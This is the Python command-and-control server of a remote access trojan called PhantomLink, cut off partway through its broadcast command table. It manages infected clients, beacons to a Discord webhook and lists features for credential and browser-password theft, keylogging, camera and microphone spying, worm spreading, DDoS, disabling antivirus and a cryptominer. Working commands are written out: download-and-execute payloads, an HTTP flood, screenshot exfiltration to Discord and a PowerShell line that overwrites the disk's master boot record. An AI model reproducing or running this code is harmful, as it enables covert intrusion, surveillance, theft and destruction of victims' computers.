import base64
import collections
import socket
import time
import threading
import struct
import os
import traceback
from datetime import datetime
import requests
from notifypy import Notify
import http.server
import json
from urllib.parse import urlparse, parse_qs
import sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import (
    API_KEY as _CONFIG_API_KEY,
    CLIENT_PASSWORD,
    DISCORD_WEBHOOK,
    ENROLLMENT_PORT,
    MANAGED_PORT,
    MANAGED_STORE,
    MANAGED_TLS_CERT,
    MANAGED_TLS_KEY,
    SERVER_IP,
)

try:
    from .commands import CmdContext, command_registry  # package mode (tests)
    from .auth import check_api_key, check_client_password
    from .protocol import decode_message, encode_message, recv_exactly
    from .crypto import decrypt, derive_key, encrypt
    from .console import console as _console  # package mode (tests)
    from .managed_auth import (
        DeviceRegistry,
        EnrollmentServer,
        EnrollmentService,
        EnrollmentStore,
        ManagedServer,
    )
except ImportError:  # script mode (python C2/C2.py)
    from commands import CmdContext, command_registry
    from auth import check_api_key, check_client_password
    from protocol import decode_message, encode_message, recv_exactly
    from crypto import decrypt, derive_key, encrypt
    from console import console as _console
    from managed_auth import (
        DeviceRegistry,
        EnrollmentServer,
        EnrollmentService,
        EnrollmentStore,
        ManagedServer,
    )

version = 11.7 #7/3/2026

HOST = "0.0.0.0"
PORT = 5000


def discord_logger(log):
    """Send a text notification to Discord via Webhook"""
    if not DISCORD_WEBHOOK:
        return
    try:
        if len(str(log)) > 1900:
            log = str(log)[:1900] + "\n... (truncated)"
        requests.post(DISCORD_WEBHOOK, json={"content": str(log)}, timeout=5)
    except Exception:
        pass


def broadcast_c2_beacon():
    """Broadcast current C2 Server IP to Discord Webhook for client dynamic resolution"""
    if not DISCORD_WEBHOOK:
        return
    try:
        lan_ip = "127.0.0.1"
        try:
            s_test = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s_test.connect(("8.8.8.8", 80))
            lan_ip = s_test.getsockname()[0]
            s_test.close()
        except Exception:
            pass

        pub_ip = ""
        try:
            pub_ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
        except Exception:
            pass

        target_ip = pub_ip if pub_ip else lan_ip
        log_msg = f"[PHANTOMLINK_C2_HOST] {target_ip} (LAN: {lan_ip} | PUB: {pub_ip})"
        requests.post(DISCORD_WEBHOOK, json={"content": log_msg}, timeout=5)
        print(f"[+] C2 IP Beacon broadcasted to Discord Webhook: {log_msg}")
    except Exception as e:
        print(f"[!] Beacon broadcast error: {e}")


def discord_send_file(file_path, message=""):
    """Send a file to Discord via Webhook"""
    if not DISCORD_WEBHOOK:
        return
    try:
        with open(file_path, 'rb') as f:
            requests.post(DISCORD_WEBHOOK,
                data={"content": message},
                files={"file": (os.path.basename(file_path), f)},
                timeout=30)
    except Exception:
        pass


class ConnectionHealth:

    def __init__(self):
        self.latency = collections.deque(maxlen=100)
        self.failed_commands = 0
        self.successful_commands = 0
        self.last_response_time = time.time()
        self.connection_quality = 100

    def record_command(self, success, response_time):
        if success:
            self.successful_commands += 1
            self.latency.append(response_time)
        else:
            self.failed_commands += 1

        self.update_quality()

    def update_quality(self):
        total = self.successful_commands + self.failed_commands
        if total == 0:
            return

        success_rate = (self.successful_commands / total) * 100
        avg_latency = sum(self.latency) / len(self.latency) if self.latency else 0

        latency_score = max(0.0, 100 - (avg_latency / 10))
        self.connection_quality = (success_rate * 0.7) + (latency_score * 0.3)

    def get_avg_latency(self):
        return sum(self.latency) / len(self.latency) if self.latency else 0

    def get_stats(self):
        return {
            'quality': f"{self.connection_quality:.1f}%",
            'latency': f"{self.get_avg_latency():.2f}s",
            'success_rate': f"{(self.successful_commands / max(1, self.successful_commands + self.failed_commands) * 100):.1f}%",
            'total_commands': self.successful_commands + self.failed_commands
        }



class ClientManager:
    def __init__(self):
        self.clients = {}
        self.client_counter = 0
        self.lock = threading.Lock()

    def add_client(self, conn, addr):
        with self.lock:
            self.client_counter += 1
            client_id = self.client_counter

            #Get credentials from client
            try:
                conn.settimeout(15.0)

                #Receive password
                password_data = self._recv_message(conn)
                if not password_data:
                    conn.close()
                    return None

                password = password_data.decode('utf-8', errors='ignore').strip()
                if not check_client_password(password, CLIENT_PASSWORD):
                    print(f"[!] Invalid password from {addr[0]}")
                    conn.close()
                    return None

                #receive username
                username_data = self._recv_message(conn)
                if username_data:
                    username = username_data.decode('utf-8', errors='ignore').strip()
                else:
                    username = "Unknown"
            except Exception as e:
                print(f"[!] Failed to get credentials: {e}")
                try:
                    conn.close()
                except Exception:
                    pass
                return None

            duplicate_id = None
            was_connected_to_duplicate = False

            for cid, client in list(self.clients.items()):
                if client['username'] == username and client['addr'][0] == addr[0]:
                    duplicate_id = cid
                    break

            if duplicate_id:
                print(
                    f"[!] Duplicate connection from {username}@{addr[0]}, removing old connection (ID: {duplicate_id})")
                discord_logger(
                    f"[!] Duplicate detected: {username}@{addr[0]}, switching from ID {duplicate_id} to {client_id}")

                old_client = self.clients[duplicate_id]
                old_client['active'] = False

                old_client['replacement_id'] = client_id

                try:
                    old_client['conn'].close()
                except Exception:
                    pass
                del self.clients[duplicate_id]

                print(f"[*] Old session disconnected. New session is ID: {client_id}")

            client_info = {
                'id': client_id,
                'conn': conn,
                'addr': addr,
                'username': username,
                'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'last_seen': datetime.now(),
                'active': True,
                'keepalive_failures': 0,
                'lock': threading.Lock(),
                'command_in_progress': False,
                'replacement_id': None,
                'health': ConnectionHealth()
            }

            self.clients[client_id] = client_info
            print(f"[+] New client connected: {username}@{addr[0]} (ID: {client_id})")

            #Send notifications
            discord_logger(f"🟢 **New client connected!**\nClient [{username}] has been connected.\nID: {client_id}\n@{addr[0]}")

            notification = Notify()
            notification.application_name = "PhantomLink"
            notification.title = "New Client Connected!"
            notification.message = f"Client: [{username}] has been connected!"
            icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "icon.png")
            if os.path.exists(icon_path):
                notification.icon = icon_path
            try:
                notification.send()
            except Exception:
                pass

            return client_id

    def remove_client(self, client_id):
        with self.lock:
            if client_id in self.clients:
                client = self.clients[client_id]
                client['active'] = False
                print(f"[-] Client disconnected: {client['username']}@{client['addr'][0]} (ID: {client_id})")

                discord_logger(f"🔴 **Client disconnected!**\nClient [{client['username']}] has been disconnected.\nID: {client_id}\n@{client['addr'][0]}")

                notification = Notify()
                notification.application_name = "PhantomLink"
                notification.title = f"{client['username']} Disconnected!"
                notification.message = f"Client: {client['username']} has been disconnected!"
                icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "icon.png")
                if os.path.exists(icon_path):
                    notification.icon = icon_path
                try:
                    notification.send()
                except Exception:
                    pass

                try:
                    client['conn'].close()
                except Exception:
                    pass
                del self.clients[client_id]

    def get_client(self, client_id):
        with self.lock:
            return self.clients.get(client_id)

    def list_clients(self):
        with self.lock:
            return dict(self.clients)

    def update_last_seen(self, client_id):
        with self.lock:
            if client_id in self.clients:
                self.clients[client_id]['last_seen'] = datetime.now()
                self.clients[client_id]['keepalive_failures'] = 0  # Reset failure counter

    def increment_keepalive_failure(self, client_id):
        with self.lock:
            if client_id in self.clients:
                self.clients[client_id]['keepalive_failures'] += 1
                return self.clients[client_id]['keepalive_failures']
        return 0

    def is_client_connected(self, client_id):
        with self.lock:
            return client_id in self.clients and self.clients[client_id]['active']

    def _send_message(self, conn, data):
        """Send data with length prefix (payload encrypted)"""
        try:
            length_packet, payload = encode_message(
                encrypt(derive_key(CLIENT_PASSWORD), data)
            )
            conn.sendall(length_packet)
            conn.sendall(payload)
            return True
        except Exception as e:
            print(f"[!] Send error: {e}")
            return False

    def _recv_message(self, conn):
        try:
            payload = decode_message(lambda n: self._recv_exactly(conn, n))
            if payload is None:
                return None
            return decrypt(derive_key(CLIENT_PASSWORD), payload)
        except Exception:
            return None

    def _recv_exactly(self, conn, n):
        return recv_exactly(conn, n)



class C2APIHandler(http.server.BaseHTTPRequestHandler):
    client_manager = None
    API_KEY = _CONFIG_API_KEY  # Loaded from config module

    def _set_headers(self, status_code=200):
        self.send_response(status_code)
        self.send_header('Content-type', 'application/json')
        self.end_headers()

    def _check_auth(self):
        """Check API key authentication"""
        api_key = self.headers.get('X-API-Key', '')
        if not check_api_key(api_key, self.API_KEY):
            self._set_headers(401)
            self.wfile.write(json.dumps({'error': 'Unauthorized - Invalid API key'}).encode())
            return False
        return True

    def do_GET(self):
        if not self._check_auth():
            return
        parsed = urlparse(self.path)
        if parsed.path == '/api/clients':
            self._set_headers()
            clients = self.client_manager.list_clients()
            safe_clients = []
            for cid, c in clients.items():
                safe_clients.append({
                    'id': cid,
                    'username': c['username'],
                    'ip': c['addr'][0]
                })
            self.wfile.write(json.dumps({'clients': safe_clients}).encode())
        elif parsed.path == '/api/status':
            self._set_headers()
            self.wfile.write(json.dumps({'status': 'ok'}).encode())
        else:
            self._set_headers(404)
            self.wfile.write(json.dumps({'error': 'Not found'}).encode())

    def do_POST(self):
        if not self._check_auth():
            return
        parsed = urlparse(self.path)
        if parsed.path == '/api/command':
            try:
                content_length = int(self.headers.get('Content-Length', 0))
            except (ValueError, TypeError):
                self._set_headers(400)
                self.wfile.write(json.dumps({'error': 'Invalid Content-Length header'}).encode())
                return
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                cmd = data.get('command')
                target = data.get('target', 'all')
                if not cmd:
                    self._set_headers(400)
                    self.wfile.write(json.dumps({'error': 'Missing command'}).encode())
                    return

                results = []
                clients = self.client_manager.list_clients()
                
                targets = []
                if target == 'all':
                    targets = list(clients.keys())
                else:
                    try:
                        targets = [int(target)]
                    except Exception:
                        pass

                def execute_cmd_for_client(cid):
                    client = self.client_manager.get_client(cid)
                    if not client:
                        return {'client_id': cid, 'status': 'not_found', 'output': 'Client not found'}

                    conn = client['conn']
                    username = client.get('username', 'Unknown')

                    with client['lock']:
                        client['command_in_progress'] = True
                        try:
                            orig_timeout = None
                            try:
                                orig_timeout = conn.gettimeout()
                            except Exception:
                                pass

                            try:
                                conn.settimeout(15.0)
                            except Exception:
                                pass

                            try:
                                if self.client_manager._send_message(conn, f"CMD:{cmd}"):
                                    response = self.client_manager._recv_message(conn)
                                    if response:
                                        out = response.decode('utf-8', errors='ignore')
                                        return {
                                            'client_id': cid,
                                            'username': username,
                                            'status': 'success',
                                            'output': out
                                        }
                                    else:
                                        return {
                                            'client_id': cid,
                                            'username': username,
                                            'status': 'no_response',
                                            'output': '[No response received from client]'
                                        }
                                else:
                                    return {
                                        'client_id': cid,
                                        'username': username,
                                        'status': 'failed',
                                        'output': '[Failed to send command over socket]'
                                    }
                            finally:
                                if orig_timeout is not None:
                                    try:
                                        conn.settimeout(orig_timeout)
                                    except Exception:
                                        pass
                        except Exception as e:
                            return {
                                'client_id': cid,
                                'username': username,
                                'status': 'error',
                                'output': f'[Error: {str(e)}]'
                            }
                        finally:
                            client['command_in_progress'] = False

                threads = []
                client_results = {}

                def worker(cid):
                    client_results[cid] = execute_cmd_for_client(cid)

                for cid in targets:
                    t = threading.Thread(target=worker, args=(cid,))
                    t.start()
                    threads.append(t)

                for t in threads:
                    t.join(timeout=30.0)

                results = []
                for cid in targets:
                    if cid in client_results:
                        results.append(client_results[cid])
                    else:
                        results.append({'client_id': cid, 'status': 'timeout', 'output': '[Execution timed out]'})

                self._set_headers()
                self.wfile.write(json.dumps({'results': results}).encode())

            except Exception as e:
                self._set_headers(500)
                self.wfile.write(json.dumps({'error': str(e)}).encode())
        else:
            self._set_headers(404)
            self.wfile.write(json.dumps({'error': 'Not found'}).encode())

def start_api_server(client_manager, port=5001):
    handler = C2APIHandler
    handler.client_manager = client_manager
    max_retries = 3
    for attempt in range(max_retries):
        try:
            httpd = http.server.HTTPServer(('0.0.0.0', port), handler)
            print(f"\n[+] API Server listening on 0.0.0.0:{port}")
            httpd.serve_forever()
        except OSError as e:
            if e.errno == 10048 or 'Address already in use' in str(e):
                print(f"\n[!] API port {port} already in use, retrying in 5s... ({attempt+1}/{max_retries})")
                import time
                time.sleep(5)
            else:
                print(f"\n[!] API Server bind error: {e}")
                break
        except Exception as e:
            print(f"\n[!] API Server error: {e}")
            break
    print(f"\n[!] API Server failed to start after {max_retries} attempts")


def handle_client_connection(client_manager, conn, addr):
    client_id = None
    keepalive_thread = None
    keepalive_event = threading.Event()

    try:
        client_id = client_manager.add_client(conn, addr)
        if not client_id:
            return

        conn.settimeout(300.0)  #5 minS timeout

        keepalive_thread = threading.Thread(
            target=keepalive_handler,
            args=(client_manager, client_id, keepalive_event),
            daemon=True
        )
        keepalive_thread.start()

        while True:
            try:
                client = client_manager.get_client(client_id)
                if not client or not client['active']:
                    break

                time.sleep(5)

            except Exception as e:
                print(f"[!] Connection error for client {client_id}: {e}")
                break


    except Exception as e:
        print(f"[!] Client connection error: {e}")
        import traceback
        traceback.print_exc()
        discord_logger(f"[!] Connection handler error: {e}\n{traceback.format_exc()}")
    finally:
        if keepalive_thread:
            keepalive_event.set()

        if client_id:
            time.sleep(1)
            client_manager.remove_client(client_id)


def keepalive_handler(client_manager, client_id, stop_event):
    if stop_event.wait(10):
        return

    while not stop_event.is_set():
        try:
            client = client_manager.get_client(client_id)
            if not client or not client['active']:
                break

            skip = False
            with client['lock']:
                if client.get('command_in_progress', False):
                    skip = True
                else:
                    conn = client['conn']
                    try:
                        conn.settimeout(10.0)

                        if not client_manager._send_message(conn, "PING"):
                            failure_count = client_manager.increment_keepalive_failure(client_id)

                            if failure_count >= 3:
                                print(f"[!] Client {client_id} keepalive failed permanently")
                                discord_logger(f"[!] Client {client_id} keepalive failed permanently")
                                client['active'] = False
                                break
                        else:
                            response = client_manager._recv_message(conn)

                            if response and response == b"PONG":
                                client_manager.update_last_seen(client_id)
                            else:
                                failure_count = client_manager.increment_keepalive_failure(client_id)

                                if failure_count >= 3:
                                    print(f"[!] Client {client_id} keepalive failed permanently")
                                    discord_logger(f"[!] Client {client_id} keepalive failed permanently")
                                    client['active'] = False
                                    break

                    except Exception as e:
                        if not stop_event.is_set():
                            print(f"[!] Keepalive error for client {client_id}: {e}")
                            discord_logger(f"[!] Keepalive error for client {client_id}: {e}")
                        break
                    finally:
                        try:
                            conn.settimeout(300.0)
                        except Exception:
                            pass

            if skip:
                time.sleep(2)
                continue

            for _ in range(15):  #Check every 2 seconds for 30 seconds total
                if stop_event.wait(2):
                    return

        except Exception as e:
            if not stop_event.is_set():
                print(f"[!] Keepalive handler error for client {client_id}: {e}")
                discord_logger(f"[!] Keepalive handler error for client {client_id}: {e}")
            break


def show_clients(client_manager):
    clients = client_manager.list_clients()
    if not clients:
        print("\n[!] No clients connected.")
        return

    print("\n" + "=" * 70)
    print("CONNECTED CLIENTS")
    print("=" * 70)
    print(f"{'ID':<4} {'Username':<15} {'IP Address':<15} {'Connected At':<20}")
    print("-" * 70)

    for client_id, client in clients.items():
        print(f"{client_id:<4} {client['username']:<15} {client['addr'][0]:<15} {client['connected_at']:<20}")

    print("=" * 70)


def interact_with_client(client_manager, client_id):
    client = client_manager.get_client(client_id)
    if not client:
        print(f"[!] Client {client_id} not found.")
        return 'continue'

    conn = client['conn']
    original_timeout = None
    username = client['username']
    addr = client['addr']

    ctx = CmdContext(cm=client_manager, client=client, conn=conn,
                     username=username, addr=addr, logger=discord_logger)

    print(f"\n[+] Connected to {username}@{addr[0]}")
    print("[+] Type 'back' to return to client selection, 'exit' to quit")

    health = client['health']
    stats = health.get_stats()
    print(f"[Health] Quality: {stats['quality']} | Latency: {stats['latency']} | Commands: {stats['total_commands']}")

    #Start health monitoring thread
    health_stop = threading.Event()

    def health_monitor():
        """Display health stats every 2.5 minutes"""
        while not health_stop.is_set():
            if health_stop.wait(150):  #2.5 minutes = 150 secondS
                break
            stats = health.get_stats()
            print(
                f"\n[Health] Quality: {stats['quality']} | Latency: {stats['latency']} | Success Rate: {stats['success_rate']}")

    health_thread = threading.Thread(target=health_monitor, daemon=True)
    health_thread.start()

    try:
        #Set timeout for interactive commands
        original_timeout = conn.gettimeout()
        conn.settimeout(300.0)

        while True:
            #Check if client is still connected
            if not client_manager.is_client_connected(client_id):
                print("[!] Client disconnected")

                replacement_id = client.get('replacement_id')
                if replacement_id and client_manager.is_client_connected(replacement_id):
                    print(f"[+] Detected new connection from same client (ID: {replacement_id})")
                    print(f"[+] Auto-switching to new connection...")
                    time.sleep(1)
                    return interact_with_client(client_manager, replacement_id)
                else:
                    #Check if a new client with same username/IP exists
                    clients = client_manager.list_clients()
                    for cid, c in clients.items():
                        if c['username'] == username and c['addr'][0] == addr[0]:
                            print(f"[+] Found reconnected client (ID: {cid})")
                            print(f"[+] Auto-switching to new connection...")
                            time.sleep(1)
                            return interact_with_client(client_manager, cid)

                break

            with client['lock']:
                client['command_in_progress'] = False

            cmd = _console.prompt(f"Shell[{username}]> ").strip()

            if cmd.lower() == 'back':
                break
            elif cmd.lower() == 'exit':
                if client_manager._send_message(conn, f"CMD:{cmd}"):
                    time.sleep(1)
                return 'exit'
            elif cmd == 'commands':
                print("""
                \n\nQuick Commands: --->

                [📁 File Operations]
                  send       : Make the client send files to the host
                  get        : Download file/s on the client from the host's server
                  copy       : Copy file
                  cut        : Move file from one place to another
                  extract    : Extract a .rar file to a location
                  archive    : Compress a file/folder into .zip
                  harvest    : Auto-search and send specific file types in User-file

                [📷 Media]
                  screenshot : Take Screenshot and send it to the host
                  camera     : Take a snapshot from the camera and send it to the host
                  record     : Record audio from the client and send it to the host
                  play       : Play an audio in the client's speaker
                  rickroll   : Play a Rickroll video
                  screenrec  : Record screen as a video and send it

                [🌐 Network & Internet]
                  wifi       : Shows the wifi passwords
                  ip         : Get the client's Public IP
                  port       : Open a new Port-Forwarding
                  hosts      : Open hosts file to block / unblock websites
                  netscan    : Scan local network for devices and informations
                  worm       : Inject PhantomLink into all PCs on the network
                  ddos       : DDOS on specific target
                  dnshijack  : Forward any connection to URL into another IP
                  sniff      : Capture all network traffic for specific duration

                [🖥️ System Info & Monitoring]
                  sys        : Shows all system info (Hardware/Software)
                  task       : Shows all of the running tasks
                  devices    : Shows the available devices
                  clipboard  : Show the last copied thing
                  browser    : Extract all browser data (includes: Passwords, Usernames/E-Mails, Cookies)
                  info       : Get all machine info
                  creds      : Get all windows credentials
                  chrome_pass: Decrypt Chrome's encrypted passwords

                [🧠 System Control]
                  sleep      : Sleep
                  logoff     : Log off the current user
                  lock       : Lockscreen (Client)
                  shutdown   : Force Shutdown to the client
                  off        : Same as shutdown
                  restart    : Force restart to the client
                  rotate     : Rotate the client's screen
                  wallpaper  : Change wallpaper of client's computer
                  block      : Temporarily block mouse and keyboard input
                  disable task manager : Disable the Task Manager
                  enable task manager  : Enable the Task Manager
                  killav     : Disable Windows Defender Anti-Virus
                  mouse      : Control Mouse
                  type       : Control Keyboard
                  spam       : Show pop up repeatedly
                  killmbr    : DESTROY the PC FOREVER!
                  fakeupdate : Shows fake Windows Update screen
                  fakelogin  : Shows fake login Pop-Up and capture credintals

                [👤 User & Execution]
                  user       : Create a user (Admin)
                  inject     : Download and execute a malware/software
                  alert      : Send a POP-UP custom alert message
                  kill       : Kill the pc temporary (Until restart)
                  rootkit    : Hide/Unhide PhantomLink completely from Task Manager

                [🧹 Utilities]
                  recycle    : Empty the recycle bin
                  ffmpeg     : Download and setup ffmpeg
                  keylogger  : Download and setup KeyLogger
                  keylog     : Get the KeyLogger's log file
                  mine       : Cryptominer
                  print      : Hijack the printer

                [💀 Danger Zone]
                  selfdestruct : REMOVE PhantomLink completely from the client

                [❓ Help]
                  commands   : Shows this help list of quick NON-CMD commands
                  update     : Update PhantomLink

                """)
                continue
            elif cmd == "":
                continue
            elif (cmd_obj := command_registry.get(cmd)) is not None:
                result = cmd_obj.handler(ctx)
                if result == 'exit':
                    return 'exit'
                elif result == 'break':
                    break
                elif result == 'continue':
                    continue
            else:
                #Send command with CMD prefix
                start_time = time.time()
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{cmd}"):
                        print("[!] Failed to send command.")
                        discord_logger(f"Failed To send Command: {cmd}")
                        client['command_in_progress'] = False
                        client['health'].record_command(False, 0)
                        break

                    #Receive response
                    response = client_manager._recv_message(conn)

                response_time = time.time() - start_time

                if response:
                    output = response.decode('utf-8', errors='ignore')
                    client['command_in_progress'] = False
                    client['health'].record_command(True, response_time)
                    if output:
                        print(output)
                        discord_logger(f"Command: {cmd}\n\n{output}")
                    else:
                        print("[No output]")
                else:
                    print("[!] No response from client.")
                    client['command_in_progress'] = False
                    client['health'].record_command(False, response_time)
                    break


    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")

    except Exception as e:
        print(f"[!] Connection error: {e}")

    finally:
        health_stop.set()
        with client['lock']:
            client['command_in_progress'] = False
        try:
            conn.settimeout(original_timeout)
        except Exception:
            pass

    return 'continue'


def main():
    client_manager = ClientManager()
    managed_stop_event = threading.Event()
    managed_server = None
    managed_thread = None
    enrollment_server = None
    enrollment_thread = None

    def cleanup_managed_services():
        managed_stop_event.set()
        errors = []
        if enrollment_server is not None:
            try:
                if enrollment_thread is not None and enrollment_thread.ident is not None:
                    enrollment_server.shutdown()
            except Exception as error:
                errors.append(f"enrollment shutdown: {error}")
            finally:
                try:
                    enrollment_server.server_close()
                except Exception as error:
                    errors.append(f"enrollment close: {error}")
        if managed_server is not None:
            try:
                managed_server.stop(timeout=5)
            except Exception as error:
                errors.append(f"managed stop: {error}")
        current_thread = threading.current_thread()
        for thread in (managed_thread, enrollment_thread):
            if (
                thread is not None
                and thread.ident is not None
                and thread is not current_thread
            ):
                try:
                    thread.join(timeout=5)
                except Exception as error:
                    errors.append(f"{thread.name} join: {error}")
        return errors

    try:
        from dashboard import start_dashboard

        dashboard_thread = threading.Thread(
            target=start_dashboard,
            args=(client_manager, 7000),
            daemon=True
        )
        dashboard_thread.start()

        time.sleep(2)

    except (ImportError, ModuleNotFoundError):
        print("[*] Dashboard module not present. Continuing without dashboard...")
    except Exception as e:
        print(f"[!] Dashboard error: {e}")
        print("[*] Continuing without dashboard...")


    # Start API server
    try:
        api_thread = threading.Thread(
            target=start_api_server,
            args=(client_manager, 5001),
            daemon=True
        )
        api_thread.start()
        time.sleep(1)
    except Exception as e:
        print(f"[!] API thread error: {e}")

    #Setup server socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        s.bind((HOST, PORT))
        s.listen(10)
    except Exception as e:
        print(f"[!] Failed to setup server: {e}")
        return

    if (
        MANAGED_TLS_CERT
        and MANAGED_TLS_KEY
        and os.path.isfile(MANAGED_TLS_CERT)
        and os.path.isfile(MANAGED_TLS_KEY)
    ):
        try:
            registry = DeviceRegistry(os.path.join(MANAGED_STORE, "devices.bin"))
            enrollment_service = EnrollmentService(
                EnrollmentStore(os.path.join(MANAGED_STORE, "tokens.json")), registry
            )
            managed_server = ManagedServer(
                HOST,
                MANAGED_PORT,
                MANAGED_TLS_CERT,
                MANAGED_TLS_KEY,
                registry,
            )
            enrollment_server = EnrollmentServer(
                HOST,
                ENROLLMENT_PORT,
                MANAGED_TLS_CERT,
                MANAGED_TLS_KEY,
                enrollment_service,
            )
            managed_thread = managed_server.start(managed_stop_event)
            enrollment_thread = threading.Thread(
                target=enrollment_server.serve_forever,
                name="enrollment-listener",
                daemon=False,
            )
            enrollment_thread.start()
            print(
                f"[+] Managed TLS on {HOST}:{MANAGED_PORT}; "
                f"enrollment HTTPS on {HOST}:{ENROLLMENT_PORT}"
            )
        except Exception as e:
            cleanup_errors = cleanup_managed_services()
            managed_server = None
            managed_thread = None
            enrollment_server = None
            enrollment_thread = None
            print(f"[!] Managed services failed: {e}")
            for cleanup_error in cleanup_errors:
                print(f"[!] Managed services cleanup error: {cleanup_error}")
    else:
        print("Managed services disabled")

    print(f"\n[+] Listening on {HOST}:{PORT}")
    threading.Thread(target=broadcast_c2_beacon, daemon=True).start()

    def accept_connections():
        while True:
            try:
                conn, addr = s.accept()
                conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

                thread = threading.Thread(
                    target=handle_client_connection,
                    args=(client_manager, conn, addr),
                    daemon=True
                )
                thread.start()
            except Exception as e:
                print(f"[!] Accept error: {e}")
                break

    accept_thread = threading.Thread(target=accept_connections, daemon=True)
    accept_thread.start()

    try:
        while True:
            print("\n" + "=" * 50)
            print(f"SHELL CONTROLLER (C2)     V: {version}")
            print("=" * 50)
            print('Commands:\nlist      - Show connected clients\nconnect   - Connect to a client\nbroadcast - Send command to all connected clients\nquit      - Exit server')
            print("=" * 50)

            try:
                choice = _console.prompt("Controller> ").strip().lower()
            except KeyboardInterrupt:
                print("\n[+] Exiting...")
                break

            if choice == 'list':
                show_clients(client_manager)

            elif choice.strip() == '':
                continue


            elif choice == 'connect':
                show_clients(client_manager)
                clients = client_manager.list_clients()

                if not clients:
                    continue

                try:
                    client_id = int(_console.prompt("\nEnter client ID to connect: "))
                    if client_id in clients:
                        result = interact_with_client(client_manager, client_id)
                        if result == 'exit':
                            break
                    else:
                        print(f"[!] Invalid client ID: {client_id}")
                except ValueError:
                    print("[!] Please enter a valid number.")
                except KeyboardInterrupt:
                    print("\n[!] Cancelled")

            elif choice == 'quit':
                print("[+] Shutting down server...")
                break


            elif choice == 'broadcast':

                cmd = _console.prompt("Command to broadcast to all clients: ").strip()

                clients = client_manager.list_clients()

                if not clients:
                    print("[!] No clients connected")

                    continue


                interactive_commands = [

                    'camera', 'wifi', 'extract', 'copy', 'cut', 'record',

                    'get', 'send', 'user', 'hide', 'archive',

                    'block', 'hosts', 'play', 'port', 'wallpaper', 'rotate',

                    'mouse', 'type', 'spam', 'dnshijack', 'sniff', 'worm',

                    'harvest', 'browser', 'netscan', 'screenrec',

                    'info', 'creds', 'chrome_pass',

                    'keylogger', 'screener', 'devices', 'ffmpeg'

                ]

                if cmd.lower() in interactive_commands:
                    print(f"[!] Command '{cmd}' requires user input and cannot be broadcast")

                    print(
                        "[!] Allowed broadcast commands: screenshot, ip, sys, task, clipboard, keylog, recycle, sleep, lock, rickroll, shutdown, restart, logoff, disable/enable task manager, update, inject, alert, ddos, kill, killmbr, killav, selfdestruct, ffmpeg")

                    continue


                actual_commands = []

                if cmd.lower() == 'update':

                    confirm = _console.prompt("Update PhantomLink on ALL clients? (y/n): ")

                    if confirm.lower().strip() != 'y':
                        print("[!] Update cancelled")

                        continue

                    discord_logger(f"{'=' * 10}\nUpdating PhantomLink on ALL clients . . .\n{'=' * 10}")

                    actual_commands = [f'curl -O http://{SERVER_IP}/PhantomLink.exe && start /B "" "PhantomLink.exe"']


                elif cmd.lower() == 'inject':

                    filename = _console.prompt("File name to inject (on server): ")

                    if not filename:
                        print("[!] No filename provided")

                        continue

                    actual_commands = [f'curl -O http://{SERVER_IP}/{filename} && start /B "" "{filename}"']


                elif cmd.lower() == 'alert':

                    title = _console.prompt("Alert title: ")

                    message = _console.prompt("Alert message: ")

                    if not title or not message:
                        print("[!] Title and message required")

                        continue


                    message = message.replace("'", "''").replace('"', '`"')

                    title = title.replace("'", "''").replace('"', '`"')

                    actual_commands = [
                        f'powershell -Command "Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox(\'{message}\', \'Critical\', \'{title}\')"']


                elif cmd.lower() == 'ddos':

                    target = _console.prompt("Target IP/URL: ")

                    duration = _console.prompt("Duration (seconds): ")

                    if not target or not duration:
                        print("[!] Target and duration required")

                        continue

                    actual_commands = [
                        f'''powershell -Command "$end = (Get-Date).AddSeconds({duration}); while((Get-Date) -lt $end) {{ try {{ Invoke-WebRequest -Uri '{target}' -Method GET -TimeoutSec 1; }} catch {{}} }}"''']


                elif cmd.lower() == 'kill':

                    confirm = _console.prompt("Kill ALL client PCs temporarily? (y/n): ")

                    if confirm.lower().strip() != 'y':
                        print("[!] Kill cancelled")

                        continue

                    discord_logger(f"Killing ALL PCs!")

                    actual_commands = ['taskkill /f /im svchost.exe']


                elif cmd.lower() == 'killmbr':

                    confirm = _console.prompt("THIS WILL BRICK ALL PCs PERMANENTLY! Type 'DESTROY ALL' to confirm: ")

                    if confirm != 'DESTROY ALL':
                        print("[!] MBR destruction cancelled")

                        continue

                    discord_logger(f"\n{'=' * 20}[!] ALL PCs BEING DESTROYED [!]\n{'=' * 20}")

                    actual_commands = [
                        r'''powershell -Command "$mbr = New-Object byte[] 512; (New-Object Random).NextBytes($mbr); $disk = [System.IO.File]::Open('\\\\.\\PhysicalDrive0', 'Open', 'Write'); $disk.Write($mbr, 0, 512); $disk.Close();"''']


                else:


                    command_map = {

                        'screenshot': [

                            'powershell -command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bmp = New-Object Drawing.Bitmap([System.Windows.Forms.SystemInformation]::VirtualScreen.Width, [System.Windows.Forms.SystemInformation]::VirtualScreen.Height); $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen([System.Windows.Forms.SystemInformation]::VirtualScreen.X, [System.Windows.Forms.SystemInformation]::VirtualScreen.Y, 0, 0, $bmp.Size); $path = Join-Path $env:USERPROFILE \\"screenshot.png\\"; $bmp.Save($path)"',

                            f'curl -F "file=@%USERPROFILE%\\screenshot.png" -F "content=Screenshot" {DISCORD_WEBHOOK}'

                        ],

                        'ip': ['powershell -Command "(Invoke-WebRequest -uri \'https://api.ipify.org\').Content"'],

                        'sys': ['systeminfo'],

                        'system': ['systeminfo'],

                        'task': ['tasklist'],

                        'clipboard': ['powershell -command "Get-Clipboard"'],

                        'keylog': [
